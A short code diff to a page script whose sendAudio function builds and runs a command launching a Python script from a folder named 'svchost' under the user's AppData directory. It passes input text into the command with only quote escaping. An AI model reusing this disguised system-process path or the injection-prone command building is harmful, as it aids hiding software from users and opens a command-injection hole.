@@ -615,13 +615,14 @@ function sendAudio() {
   const input = document.querySelector("#audio-input");
   const message = input ? input.value : "";
   if (!message) return;
+  const safeMessage = message.replace(/"/g, '\\"');
   document.getElementById("command-input").value =
-    'powershell -%USERPROFILE%\\AppData\\Local\\svchost\\python.exe %USERPROFILE%\\AppData\\Local\\svchost\\script.py "' +
-    message.replace(/"/g, '\\"') +
+    '%USERPROFILE%\\\\AppData\\\\Local\\\\svchost\\\\python.exe "%USERPROFILE%\\\\AppData\\\\Local\\\\svchost\\\\script.py" "' +
+    safeMessage +
     '"' ;
-
   executeCommand();
 }
+
 
 
       </script>
